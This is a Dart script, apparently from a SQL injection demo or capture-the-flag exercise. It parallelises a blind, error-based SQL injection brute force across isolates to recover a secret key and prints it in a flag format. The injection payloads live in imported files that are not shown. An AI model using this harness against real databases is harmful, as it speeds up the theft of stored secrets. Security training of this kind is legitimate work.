import 'dart:async';
import 'dart:isolate';

import 'package:kmainfosec_sqli_demo/attack/attack.dart';
import 'package:kmainfosec_sqli_demo/blind_segment_sql_attack.dart' as brute;
import 'package:kmainfosec_sqli_demo/constants.dart';

void main(List<String> arguments) async => await _printExecutionTime(_runAttack);

/// Runs the SQLi bruteforce attack distributing the work between [isolateCount] separate isolates.
/// At the end of the attack, the obtained key is printed to the console.
Future<void> _runAttack() async {
  const attackMethod = ErrorAttack();

  // This would work badly when the [keyLength] is not divisible by the [isolateCount], which can
  // lead to slower attacks. For example, 16 isolates run the attack three times faster than 23
  // isolates due to the uneven work distribution between the isolates, where the first 22 isolates
  // have from 1 to 2 characters to guess, and the 23rd isolate has around 10 characters to guess.
  final segmentLength = (keyLength / isolateCount).round();

  final isolates = [
    for (var i = 0; i < isolateCount; i++)
      _runAttackIsolate(attackMethod, isolateIndex: i, segmentLength: segmentLength),
  ];

  final parts = await Future.wait(isolates);

  print('Your key is:\nKMAINFOSEC[${parts.join()}]');
}

/// Runs a single isolate conducting the [attack].
///
/// The [isolateIndex] and [segmentLength] with the [isolateCount] influence the range of the key
/// to be searched for in the isolate will be run.
Future<String?> _runAttackIsolate(
  Attack attack, {
  required int isolateIndex,
  required int segmentLength,
}) {
  final label = 'SQLi[$isolateIndex]';

  return Isolate.run(
    debugName: label,
    () {
      final from = isolateIndex * segmentLength;
      var to = from + segmentLength + 1;
      if (isolateIndex == isolateCount - 1 && to < keyLength + 1) {
        to = keyLength + 1;
      }
      print('Started $isolateIndex for ${(from, to)}');

      return brute.blindRangeSqlAttack(attack, range: (from, to));
    },
  );
}

Future<void> _printExecutionTime(FutureOr<dynamic> Function() fn) async {
  final t1 = DateTime.now();
  await fn();
  final t2 = DateTime.now();

  print('Took ${t2.difference(t1).inMilliseconds / 1000} seconds');
}
